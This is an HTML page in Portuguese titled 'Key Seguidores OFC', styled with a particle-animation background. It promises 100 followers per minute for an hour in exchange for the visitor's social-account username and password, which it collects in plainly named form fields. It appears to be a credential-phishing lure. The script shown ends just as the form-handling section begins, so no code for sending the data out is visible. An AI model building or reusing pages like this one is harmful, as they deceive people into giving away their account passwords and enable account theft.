<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Key Seguidores OFC</title>
  <!-- Fonte futurista -->
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Orbitron', sans-serif;
      color: #e0e0ff;
      height: 100vh;
      overflow: hidden;
      background: #ffffff; /* página branca */
    }

    /* ===== Fundo com partículas ===== */
    #particles {
      position: fixed;
      inset: 0;
      z-index: -2;
    }

    /* Gradiente suave com detalhes */
    .bg-gradient {
      position: fixed;
      inset: 0;
      z-index: -1;
      background:
        radial-gradient(1200px 600px at 20% 10%, rgba(13,110,253,0.12), transparent 60%),
        radial-gradient(900px 450px at 80% 90%, rgba(0,255,255,0.15), transparent 60%),
        linear-gradient(180deg, rgba(13,110,253,0.08), transparent 40%);
      animation: drift 18s ease-in-out infinite alternate;
    }

    @keyframes drift {
      0%   { transform: translate3d(0,0,0); }
      100% { transform: translate3d(0,-12px,0); }
    }

    /* ===== Container ===== */
    .container {
      max-width: 500px;
      margin: 10vh auto;
      background: rgba(255,255,255,0.85);
      backdrop-filter: blur(12px) saturate(140%);
      border-radius: 20px;
      border: 1px solid rgba(13,110,253,0.25);
      box-shadow: 0 0 40px rgba(13,110,253,0.25);
      padding: 40px;
      text-align: center;
    }

    /* ===== Título e subtítulo ===== */
    .titulo {
      font-size: 2.5rem;
      color: #0d6efd;
      text-shadow: 0 0 10px #0ff, 0 0 20px #00f;
      margin-bottom: 10px;
      animation: pulsar 2s infinite alternate;
    }

    .subtitulo {
      font-size: 1.1rem;
      color: #64748b;
      margin-bottom: 30px;
    }

    @keyframes pulsar {
      from { text-shadow: 0 0 10px #0ff; }
      to { text-shadow: 0 0 30px #00f, 0 0 60px #0ff; }
    }

    /* ===== Inputs ===== */
    .formulario input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      background: #f8fbff;
      color: #0d6efd;
      font-size: 1rem;
      outline: none;
      box-shadow: inset 0 0 10px rgba(13,110,253,0.25);
      transition: 0.3s;
    }

    .formulario input:focus {
      box-shadow: inset 0 0 20px #0d6efd, 0 0 10px #0ff;
      transform: scale(1.05);
    }

    /* ===== Botão ===== */
    .btn-entrar {
      margin-top: 20px;
      padding: 14px 30px;
      font-size: 1.2rem;
      font-weight: bold;
      color: #fff;
      background: linear-gradient(90deg, #00f, #0ff);
      border: none;
      border-radius: 12px;
      cursor: pointer;
      box-shadow: 0 0 20px #0ff, 0 0 40px #00f;
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
    }

    .btn-entrar:hover {
      transform: scale(1.1);
      box-shadow: 0 0 40px #0ff, 0 0 80px #00f;
    }

    .btn-entrar::after {
      content: "";
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle, rgba(255,255,255,0.2) 10%, transparent 40%);
      animation: brilho 2s linear infinite;
    }

    @keyframes brilho {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }

    /* ===== Resultado ===== */
    .resultado {
      margin-top: 20px;
      color: #0ff;
      font-size: 1rem;
      text-shadow: 0 0 10px #0ff;
    }
  </style>
</head>
<body>
  <canvas id="particles"></canvas>
  <div class="bg-gradient"></div>

  <div class="container">
    <h1 class="titulo">⭐️ Key Seguidores ⭐️</h1>
    <p class="subtitulo">Conecte-se a sua conta para que consigamos colocar 100 Seguidores por Minuto até uma hora! - Preencha os dados abaixo.</p>
    <form id="formFuturo" class="formulario">
      <input type="text" id="campo1" name="campo1" placeholder="Digite seu nome de usuário..." required />
      <input type="text" id="campo2" name="campo2" placeholder="Digite sua senha..." required />
      <button type="submit" class="btn-entrar">ENTRAR</button>
    </form>
    <div id="resultado" class="resultado"></div>
  </div>

  <script>
    /* ===== Partículas conectadas ===== */
    const canvas = document.getElementById("particles");
    const ctx = canvas.getContext("2d");

    function resize() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    }
    resize();
    window.addEventListener("resize", resize);

    const particles = [];
    const COUNT = 100;

    class Particle {
      constructor() {
        this.x = Math.random() * canvas.width;
        this.y = Math.random() * canvas.height;
        this.size = 2;
        this.vx = (Math.random() - 0.5) * 1.2;
        this.vy = (Math.random() - 0.5) * 1.2;
      }
      update() {
        this.x += this.vx;
        this.y += this.vy;
        if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
        if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
      }
      draw() {
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        ctx.fillStyle = "#0ff";
        ctx.shadowColor = "#00f";
        ctx.shadowBlur = 12;
        ctx.fill();
      }
    }

    for (let i = 0; i < COUNT; i++) particles.push(new Particle());

    function connect() {
      const maxDist = 120;
      for (let i = 0; i < particles.length; i++) {
        for (let j = i + 1; j < particles.length; j++) {
          const dx = particles[i].x - particles[j].x;
          const dy = particles[i].y - particles[j].y;
          const dist = Math.sqrt(dx * dx + dy * dy);
          if (dist < maxDist) {
            ctx.strokeStyle = `rgba(0,255,255,${1 - dist / maxDist})`;
            ctx.lineWidth = 1;
            ctx.beginPath();
            ctx.moveTo(particles[i].x, particles[i].y);
            ctx.lineTo(particles[j].x, particles[j].y);
            ctx.stroke();
          }
        }
      }
    }

    function animate() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      particles.forEach(p => {
        p.update();
        p.draw();
      });
      connect();
      requestAnimationFrame(animate);
    }
    animate();

    /* ===== Formulário ===== */

    const resultado = document.getElementById("resultado");
